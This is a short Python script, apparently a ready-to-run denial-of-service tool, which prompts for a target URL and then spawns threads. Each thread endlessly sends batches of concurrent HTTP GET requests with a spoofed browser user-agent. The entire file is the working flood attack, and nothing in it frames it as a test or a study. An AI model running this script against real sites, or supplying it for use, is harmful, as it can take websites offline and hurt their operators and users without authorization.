import grequests
import threading

def dos(url, perloop):
    print(f'dos {url, perloop}')
    while True:
        sites = [f"{url}" for x in range(int(perloop))]
        response = (grequests.get(url, headers={'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36'}) for url in sites)
        resp = grequests.map(response)
        print(resp)

def prepearing(url, times, perloop):
    sites = [f"{url}" for x in range(int(perloop))]
    response = (grequests.get(url, headers={
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36'})
                for url in sites)
    resp = grequests.map(response)
    print(resp)
    #dos(url, perloop)
    print(url, times, perloop)
    for i in range(int(times)):
        print(f'{i+1} started')
        threading.Thread(target=dos, args=(url, perloop)).start()

prepearing(url=input("url: "), times=input("times: "), perloop=input("perloop: "))
